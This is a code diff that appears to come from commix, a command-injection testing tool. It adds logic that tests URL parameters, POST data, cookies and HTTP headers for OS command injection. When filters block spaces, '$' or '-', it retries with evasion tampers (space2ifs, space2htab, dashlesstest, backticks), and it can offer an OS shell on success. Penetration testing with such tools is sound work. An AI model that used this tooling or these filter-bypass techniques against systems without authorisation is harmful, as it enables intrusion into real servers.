+        settings.AUTO_TAMPER.append("space2ifs")
+        checks.tamper_scripts(stored_tamper_scripts=False)
+        _reset_web_root_detection()
+        end_detection = _run_and_verify()
+
+      # '${IFS}' is itself '$'-based, so a filter that blocks '$' along with the whitespace leaves
+      # that pass no better off than the one before it. A horizontal tab is still a plain POSIX
+      # word separator and needs no such substitution.
+      if not end_detection and checks.injection_techniques_status() is False and \
+            _may_adopt_tamper() and "space2htab" not in settings.MULTI_ENCODED_PAYLOAD and \
+            _accepts_whitespace_retry():
+        settings.AUTO_TAMPER.append("space2htab")
+        checks.tamper_scripts(stored_tamper_scripts=False)
+        _reset_web_root_detection()
+        end_detection = _run_and_verify()
+
+      # A filter built around '-' rather than whitespace is a different question - every
+      # numeric 'test' commix writes, including the final litmus below, leans on '-eq'/'-ne' for
+      # it. 'dashlesstest' already reads those the dash-free way ('='/'!='), so this is the one
+      # case left where retrying on a tamper already built for something else solves it outright.
+      if not end_detection and checks.injection_techniques_status() is False and \
+            _may_adopt_tamper() and "dashlesstest" not in settings.MULTI_ENCODED_PAYLOAD and \
+            _accepts_dashless_retry():
+        settings.AUTO_TAMPER.append("dashlesstest")
+        # Announced the way '--tamper' announces its own, rather than in a sentence of its own:
+        # what is loaded is the same thing either way, and worth reading as the same line.
+        checks.tamper_scripts(stored_tamper_scripts=False)
+        _reset_web_root_detection()
+        end_detection = _run_and_verify()
+
+      # The one obstacle none of the passes above can be written around: every command substitution
+      # commix writes is opened with '$', and so is the '${IFS}' the first whitespace pass reaches
+      # for - so a filter built on that character refuses them all, the dash-free tests included.
+      # A backtick opens the same substitution and is a different character, which is the whole of
+      # what is being asked here. Not offered where the substitution is not the shell's to make:
+      # 'cmd.exe' has no backtick, and an interpreter is handed a program rather than a shell line.
+      if not end_detection and checks.injection_techniques_status() is False and \
+            checks.may_retry_through_backticks() and checks.backtick_retry_consent():
+        settings.AUTO_TAMPER.append("backticks")
+        checks.tamper_scripts(stored_tamper_scripts=False)
+        _reset_web_root_detection()
+        end_detection = _run_and_verify()
+
+      # Not a filter at all, unlike the four passes above: the value is reaching the sink intact
+      # and is the problem itself, because this sink reads its first byte rather than the end of it.
+      # Left set only where it confirmed something - a pass that found nothing would otherwise hand
+      # the next parameter a value already replaced, and have it tested that way alone.
+      # Left alone where the user named a prefix of their own: that already stands in place of the
+      # value rather than behind it, so this pass would send the very same requests a second time
+      # and ask a question about something already settled.
+      if not end_detection and checks.injection_techniques_status() is False and \
+            not settings.REPLACE_VALUE and settings.TESTABLE_VALUE and \
+            not menu.options.prefix and _accepts_replaced_value_retry():
+        settings.REPLACE_VALUE = True
+        _reset_web_root_detection()
+        end_detection = _run_and_verify()
+        if checks.injection_techniques_status() is False:
+          settings.REPLACE_VALUE = False
+
+      """
+      The optimisation put back, where the pass that took it confirmed nothing.
+
+      Dropping the value is an optimisation and never evidence: the heuristic showed the sink runs
+      without it, which is not the same as every technique reaching that sink without it. A target
+      that validates what it is given can answer the heuristic and still take another path once the
+      value is three random letters, and a run that stopped there would report a parameter as not
+      injectable on the strength of a request it sent in order to go faster.
+
+      So the value goes back and the pass is made again, at the price it would have cost all along.
+      Refused afterwards, so the probe does not drop it a second time and send this round in a loop.
+      """
+      if not end_detection and checks.injection_techniques_status() is False and settings.VALUE_SKIPPED_EARLY:
+        original_value, placeholder, original_url, original_data = settings.VALUE_SKIPPED_EARLY
+        settings.VALUE_SKIPPED_EARLY = None
+        settings.VALUE_SKIP_REFUSED = True
+        settings.TESTABLE_VALUE_OPTIMIZED = False
+        settings.TESTABLE_VALUE = original_value
+        # Nothing stood in for it in the end, so nothing is left to write back into a payload.
+        settings.TESTABLE_VALUE_STOOD_IN_FOR = ""
+        menu.options.data = original_data
+        url = original_url
+        if settings.VERBOSITY_LEVEL != 0:
+          debug_msg = "Nothing was confirmed without the parameter's own value, so it is restored and tested again."
+          settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))
+        _reset_web_root_detection()
+        end_detection = _run_and_verify()
+
+      # All injection techniques seems to be failed!
+      if checks.injection_techniques_status() is False:
+        warn_msg = settings.CHECKING_PARAMETER
+        warn_msg += " does not seem to be injectable."
+        settings.print_data_to_stdout(settings.print_bold_warning_msg(warn_msg))
+      else:
+        if settings.LOAD_SESSION:
+          if settings.STORED_TECHNIQUES:
+            rows = [(row[1], row[2], row[5], row[10], "HTTP Header" if row[11] else row[12]) for row in settings.STORED_TECHNIQUES.values()]
+            checks.resumed_injection_points_summary(rows)
+          checks.suggest_os_shell()
+          checks.quit(filename, url, hard_exit=False)
+        elif settings.CONFIRMED_INJECTION_POINTS and not settings.ASKED_KEEP_TESTING:
+          settings.ASKED_KEEP_TESTING = True
+          if checks.prompt_keep_testing(url):
+            checks.quit(filename, url, hard_exit=False)
+
+    if not settings.CHECK_BOTH_OS or end_detection:
+      break
+
+"""
+Whether this parameter already has a stored session - used to test known-vulnerable ones first.
+"""
+def has_stored_session(url, check_parameter, http_request_method):
+  if menu.options.ignore_session or menu.options.flush_session or not os.path.isfile(settings.SESSION_FILE):
+    return False
+  try:
+    return bool(session_handler.load_stored_techniques(url, check_parameter, http_request_method))
+  except Exception:
+    return False
+
+"""
+Perform injection for a specific HTTP header (User-Agent, Referer, or Host)
+"""
+def http_headers_injection(url, http_request_method, filename, timesec):
+
+  # Test one HTTP header as the parameter, then put back what it held.
+  def inject_header(header_attr, option_attr, injection_flag_attr):
+    # Save the original value of the option (to restore later)
+    original_value = getattr(menu.options, option_attr)
+
+    # Enable the corresponding injection flag
+    setattr(settings, injection_flag_attr, True)
+
+    # Get the header name (e.g. "user-agent", "referer", "host")
+    header_name = getattr(settings, header_attr).lower()
+    settings.HTTP_HEADER = check_parameter = header_name
+
+    # Check if the session has stored data for this header
+    new_url, check_parameter = check_for_stored_sessions(url, check_parameter, http_request_method)
+
+    # If the header was replaced or injection failed, reset the injection flag
+    reset_flag = check_parameter != header_name
+    if not reset_flag:
+      try:
+        reset_flag = not injection_process(new_url, check_parameter, http_request_method, filename, timesec, getattr(settings, header_attr))
+      except settings.NextParameterException:
+        reset_flag = True
+    if reset_flag:
+      setattr(settings, injection_flag_attr, None)
+
+    # Restore the original option value
+    setattr(menu.options, option_attr, original_value)
+
+  # If no specific test or skip parameters and no injection flags are set, test all headers
+  no_injection_flags = not settings.USER_AGENT_INJECTION and not settings.REFERER_INJECTION and not settings.HOST_INJECTION
+  no_test_or_skip = menu.options.test_parameter is None and menu.options.skip_parameter is None
+
+  # Determine whether a header should be tested for injection
+  def test_header(header_attr):
+    # Check if the corresponding injection flag is already active
+    if getattr(settings, header_attr.upper() + "_INJECTION"):
+      return True
+
+    # A marker naming one header asks for that header - the others are reached only when nothing
+    # named a specific one, or the rest would be tested off the back of a request for this one.
+    if not no_injection_flags:
+      return False
+
+    # Named as it is written: 'ua', 'useragent' and 'user-agent' all ask for the same header.
+    if settings.TESTABLE_PARAMETERS_LIST:
+      return checks.header_named(getattr(settings, header_attr), settings.TESTABLE_PARAMETERS_LIST)
+    if settings.SKIP_PARAMETERS_LIST:
+      return not checks.header_named(getattr(settings, header_attr), settings.SKIP_PARAMETERS_LIST)
+    return True
+
+  # Test already-confirmed headers first, not in fixed order.
+  headers = ["USER_AGENT", "REFERER", "HOST"]
+  headers.sort(key=lambda header_attr: not has_stored_session(url, getattr(settings, header_attr).lower(), http_request_method))
+  header_args = {
+    "USER_AGENT": ("agent", "USER_AGENT_INJECTION"),
+    "REFERER": ("referer", "REFERER_INJECTION"),
+    "HOST": ("host", "HOST_INJECTION"),
+  }
+
+  if no_injection_flags and no_test_or_skip:
+    for header_attr in headers:
+      inject_header(header_attr, *header_args[header_attr])
+  else:
+    # Conditional injection based on test/skip flags or predefined injection settings
+    for header_attr in headers:
+      if test_header(header_attr):
+        inject_header(header_attr, *header_args[header_attr])
+
+"""
+Inject Cookie parameters
+"""
+def cookie_injection(url, http_request_method, filename, timesec):
+  if not menu.options.cookie:
+    check_parameter = settings.COOKIE.lower()
+    check_for_stored_sessions(url, check_parameter, http_request_method)
+
+  cookie = menu.options.cookie
+  if cookie:
+    settings.COOKIE_INJECTION = True
+    # Cookie Injection
+    header_name = settings.SINGLE_WHITESPACE + settings.COOKIE
+    settings.HTTP_HEADER = header_name[1:].lower()
+    cookie_parameters = parameters.do_cookie_check(menu.options.cookie)
+    if type(cookie_parameters) is str:
+      cookie_parameters_list = []
+      cookie_parameters_list.append(cookie_parameters)
+      cookie_parameters = cookie_parameters_list
+    do_injection(cookie_parameters, settings.COOKIE, url, http_request_method, filename, timesec)
+
+  if settings.COOKIE_INJECTION:
+    # Restore cookie value
+    menu.options.cookie = cookie
+    # Disable cookie injection
+    settings.COOKIE_INJECTION = False
+
+"""
+Remove parameters containing the injection tag from the testable parameters list.
+"""
+def filtered_testable_parameters():
+  settings.TESTABLE_PARAMETERS_LIST = [
+  param for param in settings.TESTABLE_PARAMETERS_LIST
+  if settings.INJECT_TAG not in param]
+  return settings.TESTABLE_PARAMETERS_LIST
+
+"""
+Process a list of parameters to test for injection vulnerabilities.
+"""
+def do_injection(found, data_type, url, http_request_method, filename, timesec):
+
+  """
+  Validate parameter names using allowed characters:
+  letters, digits, underscores, hyphens, dots, and square brackets.
+  """
+  def is_valid_param_name(name):
+    if not isinstance(name, str):
+      return False
+    name = name.strip()
+    if not name:
+      return False
+    return bool(re.match(r'^[\w._\-\[\]]+$', name, re.UNICODE))
+
+  """
+  Define the check parameter based on the data type (POST, GET, COOKIE).
+  """
+  def define_check_parameter(param, current_url):
+    if data_type == settings.HTTPMETHOD.POST:
+      menu.options.data = param
+      check_param = parameters.vuln_POST_param(param, current_url)
+    elif data_type == settings.HTTPMETHOD.GET:
+      current_url = param
+      check_param = parameters.vuln_GET_param(current_url)
+    elif data_type == settings.COOKIE:
+      menu.options.cookie = param
+      check_param = parameters.specify_cookie_parameter(param)
+    else:
+      check_param = ""
+    return current_url, check_param
+
+  """
+  Return a unique identifier for the parameter by prefixing it with the data type.
+  """
+  def get_contextual_name(check_param):
+    return checks.tested_parameter_name(data_type, check_param)
+
+  """
+  Perform the injection call and update tested parameters.
+  """
+  def injection_call(url, check_param):
+    contextual_name = get_contextual_name(check_param)
+    url, check_param = define_check_parameter(found[index], url)
+    url, check_param = check_for_stored_sessions(url, check_param, http_request_method)
+    # Dispatched as a GET, POST or Cookie parameter, and tested as one whatever it is named.
+    injection_process(url, check_param, http_request_method, filename, timesec, data_type)
+    settings.TESTED_PARAMETERS_LIST.append(contextual_name)
+
+  check_parameters = []
+  param_mapping = {}
+
+  # Filter and validate parameters to prepare for injection tests
+  for param in found:
+    url, check_param = define_check_parameter(param, url)
+    if not check_param:
+      continue
+    contextual_name = get_contextual_name(check_param)
+    if contextual_name in settings.TESTED_PARAMETERS_LIST:
+      continue
+    if not is_valid_param_name(check_param):
+      continue
+    check_parameters.append(check_param)
+    param_mapping[check_param] = param
+
+  # Prepare testable parameters
+  filtered_testable_parameters()
+  checks.testable_parameters(url, check_parameters)
+
+  # Custom marker parameters are always targeted, regardless of -p/--skip.
+  custom_params = set(settings.CUSTOM_INJECTION_MARKER_PARAMETERS_LIST) \
+    if settings.CUSTOM_INJECTION_MARKER else set()
+
+  # Test already-confirmed parameters first, not in request order.
+  if not menu.options.ignore_session and not menu.options.flush_session and os.path.isfile(settings.SESSION_FILE):
+    # Whether this parameter already has a finding stored from an earlier run.
+    def has_stored_session(check_param):
+      try:
+        return bool(session_handler.load_stored_techniques(url, check_param, http_request_method))
+      except Exception:
+        return False
+    check_parameters.sort(key=lambda param: not has_stored_session(param))
+
+  for check_param in check_parameters:
+    contextual_name = get_contextual_name(check_param)
+    if contextual_name in settings.TESTED_PARAMETERS_LIST:
+      continue
+
+    try:
+      original_param = param_mapping[check_param]
+      index = found.index(original_param)
+    except (KeyError, ValueError):
+      continue
+
+    if check_param in custom_params or checks.is_parameter_testable(check_param):
+      try:
+        injection_call(url, check_param)
+      except settings.NextParameterException:
+        continue
+
+"""
+Check if HTTP Method is GET.
+"""
+def get_request(url, http_request_method, filename, timesec):
+  found_url = parameters.do_GET_check(url, http_request_method)
+
+  if found_url is not False:
+    do_injection(found_url, settings.HTTPMETHOD.GET, url, http_request_method, filename, timesec)
+
+"""
+Check if HTTP Method is POST.
+"""
+def post_request(url, http_request_method, filename, timesec):
+
+  parameter = settings.USER_DEFINED_POST_DATA
+  found_parameter = parameters.do_POST_check(parameter, http_request_method)
+
+  if type(found_parameter) is str:
+    found_parameter_list = []
+    found_parameter_list.append(found_parameter)
+    found_parameter = found_parameter_list
+
+  if any((settings.IS_JSON, settings.IS_XML)):
+    # Remove junk data
+    found_parameter = [x for x in found_parameter if settings.INJECT_TAG in x]
+  else:
+    # Remove whitespaces
+    found_parameter = [x.replace(settings.SINGLE_WHITESPACE, "") for x in found_parameter]
+
+  do_injection(found_parameter, settings.HTTPMETHOD.POST, url, http_request_method, filename, timesec)
+
+"""
+Perform GET / POST parameters checks
+"""
+def data_checks(url, http_request_method, filename, timesec):
+  settings.CUSTOM_HEADER_INJECTION = False
+
+  init_cookie_injection_status()
+  # Neither sweep reports back, so both are run rather than one gating the other.
+  if settings.USER_DEFINED_POST_DATA and not settings.IGNORE_USER_DEFINED_POST_DATA:
+    post_request(url, http_request_method, filename, timesec)
+    if not settings.SKIP_NON_CUSTOM_PARAMS:
+      get_request(url, http_request_method, filename, timesec)
+  else:
+    # The POST body is either absent or not the one under test, so only the URL is swept.
+    get_request(url, http_request_method, filename, timesec)
+
+"""
+Perform checks over cookie values.
+"""
+def cookies_checks(url, http_request_method, filename, timesec): 
+  if len([i for i in settings.TESTABLE_PARAMETERS_LIST if i in str(menu.options.cookie)]) != 0 or \
+    settings.INJECTION_MARKER_LOCATION.COOKIE or \
+    settings.COOKIE_INJECTION:
+    if not settings.SKIP_NON_CUSTOM_PARAMS:
+      cookie_injection(url, http_request_method, filename, timesec)
+
+"""
+Perform checks over HTTP Headers parameters.
+"""
+def headers_checks(url, http_request_method, filename, timesec):
+  if checks.any_header_named(settings.TESTABLE_PARAMETERS_LIST) or \
+    settings.INJECTION_MARKER_LOCATION.HTTP_HEADERS or \
+    settings.HTTP_HEADERS_INJECTION:
+    if not settings.SKIP_NON_CUSTOM_PARAMS:
+      http_headers_injection(url, http_request_method, filename, timesec)
+
+"""
+Perform checks over custom HTTP Headers parameters.
+"""
+def custom_headers_checks(url, http_request_method, filename, timesec): 
+  for name in range(len(settings.CUSTOM_HEADERS_NAMES)):
+    if settings.ASTERISK_MARKER in settings.CUSTOM_HEADERS_NAMES[name].split(": ")[1] and not settings.CUSTOM_INJECTION_MARKER:
+      settings.CUSTOM_HEADER_INJECTION = False
+    else:
+      settings.CUSTOM_HEADER_INJECTION = True
+      settings.CUSTOM_HEADER_NAME = settings.CUSTOM_HEADERS_NAMES[name].split(": ")[0]
+      settings.HTTP_HEADER = check_parameter = header_name = settings.CUSTOM_HEADER_NAME.lower()
+      settings.CUSTOM_INJECTION_MARKER_PARAMETERS_LIST.append(check_parameter) if check_parameter not in settings.CUSTOM_INJECTION_MARKER_PARAMETERS_LIST else settings.CUSTOM_INJECTION_MARKER_PARAMETERS_LIST
+      settings.CUSTOM_HEADER_VALUE = settings.CUSTOM_HEADERS_NAMES[name].split(": ")[1].replace(settings.ASTERISK_MARKER, settings.INJECT_TAG)
+      url, check_parameter = check_for_stored_sessions(url, check_parameter, http_request_method)
+      try:
+        if check_parameter != header_name or not injection_process(url, check_parameter, http_request_method, filename, timesec, settings.CUSTOM_HEADER_PLACE):
+          settings.CUSTOM_HEADER_INJECTION = False
+      except settings.NextParameterException:
+        settings.CUSTOM_HEADER_INJECTION = False
+      settings.CUSTOM_HEADERS_NAMES[name] = checks.remove_tags(settings.CUSTOM_HEADERS_NAMES[name])
+  settings.CUSTOM_HEADER_INJECTION = False
+
+"""
+Perform checks across multiple HTTP components (URL parameters, POST data, cookies,
+standard headers, and custom headers) to identify possible injection points.
+"""
+def perform_checks(url, http_request_method, filename):
+
+  # Prepare whitespaces if multiple targets or stdin parsing is used,
+  # and more than one whitespace character is defined. Keep only one.
+  # The literal constant is what every whitespace tamper's own reclaim check compares against - a
+  # URL-quoted one ('%20') never equals it, and so is never reclaimed, leaving it stuck underneath
+  # whatever a tamper appends instead.
+  if (settings.MULTI_TARGETS or settings.STDIN_PARSING) and \
+     len(settings.WHITESPACES) > 1:
+    settings.WHITESPACES = [settings.SINGLE_WHITESPACE]
+
+  timesec = settings.TIMESEC
+
+  # Handle authentication if both the authentication URL and the authentication data are provided.
+  if menu.options.auth_url and menu.options.auth_data:
+    authentication.authentication_process(http_request_method)
+    try:
+      response = headers.send_raw(url)
+      try:
+        main_content = response.read()
+      finally:
+        response.close()
+
+      response = headers.send_raw(menu.options.auth_url)
+      try:
+        auth_content = response.read()
+      finally:
+        response.close()
+
+      # Verify authentication success by comparing the response content of the main URL and the auth URL.
+      if main_content == auth_content:
+        err_msg = "Authentication failed using the specified credentials and URL."
+        settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
+        raise SystemExit(settings.EXIT_FAILURE)
+
+    except (_urllib.error.URLError, _urllib.error.HTTPError) as err_msg:
+      # Authentication request failed due to a connection or HTTP error.
+      settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
+      raise SystemExit(settings.EXIT_FAILURE)
+
+  # If only one of the required authentication options is provided, display an error and exit.
+  elif menu.options.auth_url or menu.options.auth_data:
+    err_msg = "Authentication requires specifying both '--auth-url' and '--auth-data' options."
+    settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
+    raise SystemExit(settings.EXIT_FAILURE)
+
+  # If shellshock testing is enabled, force the injection level to HTTP header level.
+  if menu.options.shellshock:
+    settings.INJECTION_LEVEL = settings.HTTP_HEADER_INJECTION_LEVEL
+  else:
+    # If the user specified a custom injection level and no custom marker is used,
+    # set the level to the user-defined value.
+    if settings.INJECTION_LEVEL != settings.DEFAULT_INJECTION_LEVEL and \
+       not settings.CUSTOM_INJECTION_MARKER:
+      settings.INJECTION_LEVEL = settings.USER_APPLIED_LEVEL
+
+  proceed_non_custom = True
+  
+  # Perform custom marker-based checks if custom injection marker is enabled.
+  if settings.CUSTOM_INJECTION_MARKER:
+    proceed_non_custom = False
+
+    # Perform checks over GET and POST parameters.
+    if settings.INJECTION_MARKER_LOCATION.URL or \
+       settings.INJECTION_MARKER_LOCATION.DATA:
+      data_checks(url, http_request_method, filename, timesec)
+
+    # Perform checks over cookie values.
+    if settings.INJECTION_MARKER_LOCATION.COOKIE:
+      cookies_checks(url, http_request_method, filename, timesec)
+
+    # Perform checks over standard HTTP headers (User-Agent, Referer, Host).
+    if settings.INJECTION_MARKER_LOCATION.HTTP_HEADERS:
+      headers_checks(url, http_request_method, filename, timesec)
+
+    # Perform checks over custom user-defined HTTP headers.
+    if settings.INJECTION_MARKER_LOCATION.CUSTOM_HTTP_HEADERS:
+      custom_headers_checks(url, http_request_method, filename, timesec)
+
+    # Check if the injection marker is set in either URL or POST data (but not both)
+    has_exclusive_marker = settings.INJECTION_MARKER_LOCATION.URL ^ settings.INJECTION_MARKER_LOCATION.DATA
+    # Check if no injection marker is set in either URL or POST data
+    has_no_marker = not settings.INJECTION_MARKER_LOCATION.URL and not settings.INJECTION_MARKER_LOCATION.DATA
+    # If there’s user POST data and an exclusive marker, or no marker at all,
+    # and no testable GET parameters, proceed with non-custom checks
+    if has_exclusive_marker or has_no_marker:
+      checks.process_non_custom()
+
+  # Perform default (non-custom) injection checks if not explicitly skipped.
+  if not settings.SKIP_NON_CUSTOM_PARAMS:
+    # Disable custom injection mode before running default checks.
+    settings.CUSTOM_INJECTION_MARKER = False
+
+    # Perform checks over GET/POST parameters if allowed or marker is not set in URL/DATA.
+    if settings.TESTABLE_PARAMETERS_LIST or \
+       not settings.INJECTION_MARKER_LOCATION.URL or \
+       not settings.INJECTION_MARKER_LOCATION.DATA:
+      data_checks(url, http_request_method, filename, timesec)
+
+    if proceed_non_custom:
+      # Determine if we should perform cookie-based injection checks.
+      cookie_check = (settings.TESTABLE_PARAMETERS_LIST or \
+                      not settings.INJECTION_MARKER_LOCATION.COOKIE) and \
+                      settings.INJECTION_LEVEL >= settings.COOKIE_INJECTION_LEVEL
+      if cookie_check:
+        settings.COOKIE_INJECTION = True
+        cookies_checks(url, http_request_method, filename, timesec)
+
+      # Whether a standard header was asked for by name, under any of the names it answers to.
+      header_found = checks.any_header_named(settings.TESTABLE_PARAMETERS_LIST)
+
+      # Decide if header-based injection should be tested.
+      header_check = (settings.TESTABLE_PARAMETERS_LIST or \
+                      not settings.INJECTION_MARKER_LOCATION.HTTP_HEADERS) and \
+                      settings.INJECTION_LEVEL == settings.HTTP_HEADER_INJECTION_LEVEL or header_found
+
+      if header_check:
+        # Perform custom headers injection checks.
+        settings.CUSTOM_HEADER_INJECTION = True
+        custom_headers_checks(url, http_request_method, filename, timesec)
+
+        settings.HTTP_HEADERS_INJECTION = True
+        headers_checks(url, http_request_method, filename, timesec)
+
+  # Return True if injection checks are active/enabled, False otherwise.
+  return settings.INJECTION_CHECKER is not False
+
+
+"""
+General check on every injection technique.
+"""
+def do_check(url, http_request_method, filename):
+  try:
+    if settings.RECHECK_FILE_FOR_EXTRACTION:
+      settings.RECHECK_FILE_FOR_EXTRACTION = False
+
+    # Check for '--tor' switch.
+    if menu.options.tor:
+      if checks.technique_selected("t") or checks.technique_selected("f"):
+        warn_msg = "It is highly recommended to avoid usage of switch '--tor' for "
+        warn_msg += "time-based injections because of inherent high latency time."
+        settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
+
+    # Check target URL for CGI scripts vulnerable to Shellshock.
+    checks.check_CGI_scripts(url)
+    # Modules don't need a normal testable parameter to run.
+    modules_handler.load_modules(url, http_request_method, filename)
+    perform_checks(url, http_request_method, filename)
+      
+    # All injection techniques seems to be failed!
+    if not settings.INJECTION_CHECKER and not settings.LOAD_SESSION:
+      if settings.NOT_TESTABLE_PARAMETERS:
+        err_msg = checks.nothing_tested_message()
+      else:
+        err_msg = "All tested parameters do not appear to be injectable."
+        if settings.INJECTION_LEVEL < settings.HTTP_HEADER_INJECTION_LEVEL :
+          err_msg += " Try to increase value for '--level' option"
+          err_msg += " if you wish to perform more tests."
+        if settings.USER_APPLIED_TECHNIQUE or settings.SKIP_TECHNIQUES:
+          err_msg += " You can try to re-run without providing the option "
+          if not settings.SKIP_TECHNIQUES :
+            err_msg += "'--technique'."
+          else:
+            err_msg += "'--skip-technique'."
+          untested = checks.untested_techniques()
+          if untested:
+            err_msg += " That would also test the " + untested + "."
+        # A selection that leaves few boundaries, or none, is not something a target did - and what
+        # was never sent cannot have been answered.
+        if menu.options.test_filter or menu.options.test_skip:
+          err_msg += " Only the payload boundaries "
+          if menu.options.test_filter:
+            err_msg += "matching '" + str(menu.options.test_filter) + "'"
+            err_msg += " and " if menu.options.test_skip else ""
+          if menu.options.test_skip:
+            err_msg += "not matching '" + str(menu.options.test_skip) + "'"
+          err_msg += " were sent, so this says nothing about the ones that were not."
+        # A client forced with '--oob-transport' that the target does not have answers nothing, which
+        # is the same silence a parameter that is not injectable produces.
+        if menu.options.oob_transport and settings.OOB_CHANNEL is not None and settings.OOB_STATE is not True:
+          err_msg += " Out-of-band testing was held to the '" + str(menu.options.oob_transport) + "' client by "
+          err_msg += "'--oob-transport' and nothing came back, which is also how a target without that client answers."
+        # A shell that complained about what it was given did run it, so what is missing is the way
+        # the payload was put together rather than a way in.
+        if settings.SHELL_ERROR_SEEN:
+          err_msg += " The target answered with shell or interpreter errors while being tested, so the payload did reach one"
+          if not menu.options.parse_errors:
+            err_msg += " - the '--parse-errors' option shows what it said"
+          err_msg += "."
+        if not menu.options.eval_sink:
+          err_msg += " Code injection was not tested; the '--eval' option tests for it."
+        # The header one is only worth raising while the request still names this tool: a run that
+        # already carries a browser's own - asked for, or settled by the evasion - has nothing to
+        # gain by it. Said at all only where one of the two is left to suggest, since a run already
+        # carrying both would otherwise be told to try something and not told what.
+        suggestions = []
+        if not menu.options.tamper:
+          suggestions.append("use option '--tamper'")
+        if not menu.options.random_agent and not settings.BROWSER_LIKE_HEADERS:
+          suggestions.append("switch '--random-agent'")
+        if suggestions:
+          err_msg += " If you suspect that there is some kind of protection mechanism involved, maybe you could try to "
+          err_msg += " and/or ".join(suggestions) + "."
+        err_msg += checks.tamper_shell_feature_note()
+        """
+        A page that is mostly layout answers the comparison badly: what a command prints is a
+        handful of characters against kilobytes of markup, so the two answers come back all but
+        identical either way. Worth raising only here - before this, nothing has gone wrong yet.
+        """
+        if not menu.options.text_only and settings.ORIGINAL_PAGE:
+          percent = checks.page_text_percent(settings.ORIGINAL_PAGE)
+          if settings.DYNAMIC_MARKINGS:
+            err_msg += " You can give it a go with the switch '--text-only', where the target page"
+            err_msg += " has a low percentage of textual content (~" + str(round(percent, 2))
+            err_msg += "% of page content is text)."
+          elif percent < settings.LOW_TEXT_PERCENT:
+            err_msg += " Please retry with the switch '--text-only', as this case looks like a"
+            err_msg += " candidate for it: a low percentage of textual content (~" + str(round(percent, 2))
+            err_msg += "% of page content is text), together with no parameter found to be dynamic."
+        if settings.MULTI_TARGETS:
+          err_msg += " Skipping to the next target."
+      # Said out loud as the verdict it is, but kept out of the report's errors: a run that tested
+      # everything it was asked to and found nothing is a run that worked.
+      settings.print_data_to_stdout(settings.print_critical_msg(err_msg, record=False))
+      if not settings.MULTI_TARGETS:
+        # What the run produced is written even where it found nothing: the traffic it sent and the
+        # report of it are the output of a run that came up empty just as much as of one that did not,
+        # and a run that found nothing is the one whose traffic is worth reading.
+        checks.finish_target()
+        logs.print_logs_notification(filename, url)
+        common.show_http_error_codes()
+        raise SystemExit(settings.EXIT_NOTHING_FOUND)
+    elif settings.MULTI_TARGETS:
+      checks.finish_target()
+      logs.print_logs_notification(filename, url)
+    else:
+      # Summary, deferred actions, os-shell entry, log notice and exit all happen in quit().
+      checks.quit(filename, url, hard_exit=False)
+
+  except KeyboardInterrupt:
+    checks.handle_early_interrupt(filename, url)
+
+# eof
